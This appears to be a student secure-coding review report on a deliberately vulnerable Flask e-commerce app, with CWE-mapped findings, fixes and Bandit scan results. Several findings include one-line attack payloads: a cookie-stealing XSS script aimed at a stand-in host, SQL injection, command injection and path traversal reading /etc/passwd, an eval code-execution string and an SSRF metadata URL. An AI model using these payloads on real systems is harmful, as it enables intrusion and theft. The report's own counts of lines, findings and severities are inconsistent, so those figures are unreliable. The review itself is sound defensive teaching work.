# Secure Coding Review Report — "VulnShop" Flask Application

**Audit target:** Python 3 / Flask e-commerce backend (`vulnerable_app/app.py`)
**Review type:** Manual source-code inspection + automated static analysis (SAST)
**Tool used:** [Bandit](https://bandit.readthedocs.io/) v1.9.4 (Python security linter, OWASP-aligned)
**Lines of code reviewed:** 100
**Date:** 2026-09-08
**Reviewer:** Prabhat (student audit) with Claude-assisted review

---

## 1. Objective and Scope

This review audits a single-file Flask application that simulates a small
e-commerce backend (login, search, file download, cart, invoice fetch,
health-check "ping" utility, and a calculator endpoint). The goal is to:

1. Identify security vulnerabilities using both automated static analysis
   and manual inspection.
2. Map each finding to its root cause and relevant CWE / OWASP category.
3. Provide concrete, tested remediation for every finding.
4. Re-run the scanner against the fixed code to verify the fixes actually
   reduce risk, rather than just asserting it.

## 2. Methodology

| Step | Method |
|---|---|
| 1 | **Manual read-through** of every route handler, tracing untrusted input (`request.args`, `request.form`, `request.data`) to its sink (SQL, shell, filesystem, `eval`, template render, deserializer). |
| 2 | **Static analysis** with Bandit (`bandit -r vulnerable_app/`), which flags known-dangerous API usage and common weakness patterns (CWE-mapped). |
| 3 | **Triage** — each Bandit finding was manually verified against the source (no findings were accepted at face value) to rule out false positives. |
| 4 | **Remediation** — a fixed version (`fixed_app/app.py`) was written addressing every confirmed finding. |
| 5 | **Regression scan** — Bandit was re-run against the fixed code to confirm the issue count and severity dropped, and any residual findings were reviewed as false-positive/accepted-risk. |

Raw scanner output is included in this package as `bandit_report.txt` /
`bandit_report.json` (vulnerable app) and `bandit_report_fixed.txt` (fixed app).

## 3. Summary of Results

| | Vulnerable app | Fixed app |
|---|---|---|
| High severity | 4 | 0 |
| Medium severity | 5 | 1 (accepted risk, see §5) |
| Low severity | 5 | 3 (accepted risk, see §5) |
| **Total issues** | **14** | **4** |

## 4. Findings

Each finding below lists: description, location, CWE, OWASP Top 10 (2021)
category, severity, proof-of-concept, and the fix applied.

### VULN-01 — Hardcoded secrets in source (`app.secret_key`, admin password, API key)
- **Location:** `app.py:23-25`
- **CWE:** CWE-798 (Use of Hard-coded Credentials)
- **OWASP:** A05:2021 – Security Misconfiguration
- **Severity:** High
- **Risk:** Anyone with repo access (or a leaked build artifact) gets the
  Flask session-signing key, the admin password, and a live payment API key.
- **Fix:** Load all secrets from environment variables / a secrets manager
  (`os.environ[...]`); nothing sensitive committed to source control. Added
  `.env` to `.gitignore` pattern (see §6).

### VULN-02 — Weak, unsalted password hashing (MD5)
- **Location:** `hash_password()`, `app.py:53-54`
- **CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-759 (Missing Salt)
- **OWASP:** A02:2021 – Cryptographic Failures
- **Severity:** High
- **Risk:** MD5 is fast and unsalted → trivially brute-forced/rainbow-tabled
  offline if the DB leaks.
- **Fix:** `werkzeug.security.generate_password_hash` / `check_password_hash`
  (PBKDF2-SHA256 with per-password salt and a configurable work factor).

### VULN-03 — SQL Injection in `/login`
- **Location:** `app.py:66-71`
- **CWE:** CWE-89 (SQL Injection)
- **OWASP:** A03:2021 – Injection
- **Severity:** Critical
- **PoC:** `username = admin' --` bypasses the password check entirely by
  commenting out the rest of the query.
- **Fix:** Parameterized query — `conn.execute("SELECT ... WHERE username = ?", (username,))`.
  The DB driver handles escaping; user input is never part of the SQL string.

### VULN-04 — Predictable session token (weak PRNG)
- **Location:** `app.py:83` (`random.randint`)
- **CWE:** CWE-330 (Use of Insufficiently Random Values)
- **OWASP:** A02:2021 – Cryptographic Failures
- **Severity:** High
- **Risk:** `random` is a Mersenne Twister — not cryptographically secure and
  only produces a 6-digit space (1,000,000 possibilities), brute-forceable.
- **Fix:** `secrets.token_urlsafe(32)` — CSPRNG, 256 bits of entropy.

### VULN-05 — Session cookie missing `Secure` / `HttpOnly` / `SameSite`
- **Location:** `app.py:84`
- **CWE:** CWE-614 (Sensitive Cookie Without 'Secure' Attribute), CWE-1004
- **OWASP:** A05:2021 – Security Misconfiguration
- **Severity:** Medium
- **Risk:** Token can be read by JavaScript (XSS token theft), sent over
  plain HTTP, and attached to cross-site requests (CSRF).
- **Fix:** `set_cookie(..., secure=True, httponly=True, samesite="Lax")`.

### VULN-06 — Reflected XSS in `/search`
- **Location:** `app.py:92-95`
- **CWE:** CWE-79 (Cross-Site Scripting)
- **OWASP:** A03:2021 – Injection
- **Severity:** High
- **PoC:** `/search?q=<script>document.location='//evil.tld/steal?c='+document.cookie</script>`
- **Fix:** Pass user data as a Jinja2 variable (`{{ q }}`) instead of
  f-string-splicing it into the template source — Jinja2 auto-escapes by
  default when it isn't handed pre-built HTML.

### VULN-07 — OS Command Injection in `/ping`
- **Location:** `app.py:104-108`
- **CWE:** CWE-78 (OS Command Injection)
- **OWASP:** A03:2021 – Injection
- **Severity:** Critical
- **PoC:** `/ping?host=127.0.0.1;cat /etc/passwd` runs an arbitrary second command.
- **Fix:** Drop `shell=True` entirely, pass the command as an argument list
  (`["ping","-c","1",host]`), and additionally allow-list the `host`
  parameter to `[A-Za-z0-9.-]` before use (defense in depth).

### VULN-08 — Path Traversal in `/download`
- **Location:** `app.py:117-121`
- **CWE:** CWE-22 (Path Traversal)
- **OWASP:** A01:2021 – Broken Access Control
- **Severity:** High
- **PoC:** `/download?file=../../../../etc/passwd`
- **Fix:** Resolve `filename` against a fixed allow-list of permitted file
  names rather than trusting any path segment from the client.

### VULN-09 — Insecure Deserialization in `/cart`
- **Location:** `app.py:127-129`
- **CWE:** CWE-502 (Deserialization of Untrusted Data)
- **OWASP:** A08:2021 – Software and Data Integrity Failures
- **Severity:** Critical
- **Risk:** `pickle.loads()` on attacker-supplied bytes can execute arbitrary
  code via a crafted `__reduce__` payload — full RCE.
- **Fix:** Replace with `request.get_json()` plus explicit schema/type
  validation. JSON is data-only and cannot express code execution.

### VULN-10 — Server-Side Request Forgery (SSRF) in `/fetch-invoice`
- **Location:** `app.py:136-140`
- **CWE:** CWE-918 (SSRF)
- **OWASP:** A10:2021 – Server-Side Request Forgery
- **Severity:** High
- **Risk:** Attacker supplies `url=http://169.254.169.254/latest/meta-data/`
  (cloud metadata endpoint) or an internal-only admin URL, pivoting through
  the server's network position.
- **Fix:** Enforce `scheme == "https"` and `hostname` in a strict allow-list
  before opening the connection.

### VULN-11 — Open Redirect in `/go`
- **Location:** `app.py:145-148`
- **CWE:** CWE-601 (URL Redirection to Untrusted Site)
- **OWASP:** A01:2021 – Broken Access Control
- **Severity:** Medium
- **Risk:** Used in phishing — `yourshop.com/go?next=evil.tld` looks
  trustworthy in a link preview.
- **Fix:** Only redirect to a fixed set of known in-app relative paths.

### VULN-12 — Arbitrary code execution via `eval()` in `/calc`
- **Location:** `app.py:157-159`
- **CWE:** CWE-95 (Eval Injection)
- **OWASP:** A03:2021 – Injection
- **Severity:** Critical
- **PoC:** `/calc?expr=__import__('os').system('id')`
- **Fix:** Parse the expression with `ast.parse` and walk the tree,
  rejecting any node that isn't a numeric literal or arithmetic operator,
  before evaluating the *validated* AST — never the raw string.

### VULN-13 — Debug mode + bind-all-interfaces in production entrypoint
- **Location:** `app.py:167-168`
- **CWE:** CWE-489 (Active Debug Code), CWE-605 (Multiple Binds to Same Port)
- **OWASP:** A05:2021 – Security Misconfiguration
- **Severity:** High
- **Risk:** `debug=True` exposes the interactive Werkzeug debugger, which
  allows arbitrary code execution to anyone who can trigger a traceback.
  `0.0.0.0` exposes the dev server to the whole network.
- **Fix:** Debug flag and bind host driven by environment variables,
  defaulting to `False` / `127.0.0.1`. Production should run under a real
  WSGI server (gunicorn/uWSGI) behind a reverse proxy, not `app.run()`.

## 5. Residual / Accepted-Risk Findings (fixed app)

Bandit still flags 4 low/medium items in `fixed_app/app.py`. These were
manually reviewed and are **accepted**, not overlooked:

- **B404/B603/B607 (subprocess usage in `/ping`):** subprocess is still used,
  but with `shell=False`, an argument list, and a strict input allow-list —
  the specific injection Bandit warns about is already closed. Flagged
  because Bandit cannot verify the allow-list logic statically.
- **B310 (`urlopen` in `/fetch-invoice`):** scheme and hostname are validated
  against an allow-list immediately before the call. Bandit flags any
  `urlopen` call regardless of surrounding guards.

Both are documented here so a future reviewer doesn't have to re-derive the
reasoning — this is a deliberate practice, not a gap.

## 6. General Secure-Coding Recommendations

1. **Never trust client input.** Validate type, length, and format at every
   entry point (allow-list, not deny-list, where possible).
2. **Parameterize all queries.** No string concatenation/formatting into
   SQL, shell commands, or file paths — ever.
3. **Use vetted crypto primitives.** `werkzeug.security` /
   `passlib` / `bcrypt` for passwords; `secrets` for tokens; never `random`
   or MD5/SHA1 for anything security-relevant.
4. **Principle of least privilege.** DB accounts, file permissions, and
   cloud IAM roles used by the app should have the minimum access needed.
5. **Secrets management.** Environment variables at minimum; a vault
   (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) for production.
   Add `*.env`, `*.pem`, `secrets/` to `.gitignore`.
6. **Secure defaults.** Debug mode off, cookies `Secure`/`HttpOnly`/`SameSite`,
   TLS enforced, verbose stack traces disabled in production.
7. **Dependency hygiene.** Run `pip-audit` / `safety` in CI to catch known-CVE
   packages; pin versions in `requirements.txt`.
8. **Shift-left with CI gating.** Run Bandit (Python), `semgrep`, or
   language-appropriate SAST on every pull request; fail the build on
   High/Critical findings.
9. **Defense in depth.** Combine input validation *and* output encoding
   *and* least-privilege *and* allow-listing — don't rely on a single control.
10. **Log and monitor,** but never log secrets, tokens, or full credit-card
    numbers (this feeds directly into the IDS/monitoring work in Task 4).

## 7. Remediation Verification

| Metric | Before | After |
|---|---|---|
| Bandit High-severity findings | 4 | 0 |
| Bandit Medium-severity findings | 5 | 1 (accepted risk) |
| Bandit Low-severity findings | 5 | 3 (accepted risk) |
| SQL Injection | Present | Eliminated (parameterized queries) |
| RCE vectors (eval, pickle, shell=True) | 3 | 0 |
| Hardcoded secrets | 3 | 0 |

Command used to reproduce:

```bash
pip install bandit --break-system-packages
bandit -r vulnerable_app/ -f txt -o bandit_report.txt
bandit -r fixed_app/      -f txt -o bandit_report_fixed.txt
```

## 8. Package Contents

```
task3-secure-coding-review/
├── SECURITY_REVIEW_REPORT.md   <- this report
├── vulnerable_app/app.py       <- audit target (14 intentional vulns)
├── fixed_app/app.py            <- remediated version
├── bandit_report.txt           <- raw Bandit scan, vulnerable app
├── bandit_report.json          <- same scan, machine-readable
└── bandit_report_fixed.txt     <- raw Bandit scan, fixed app
```
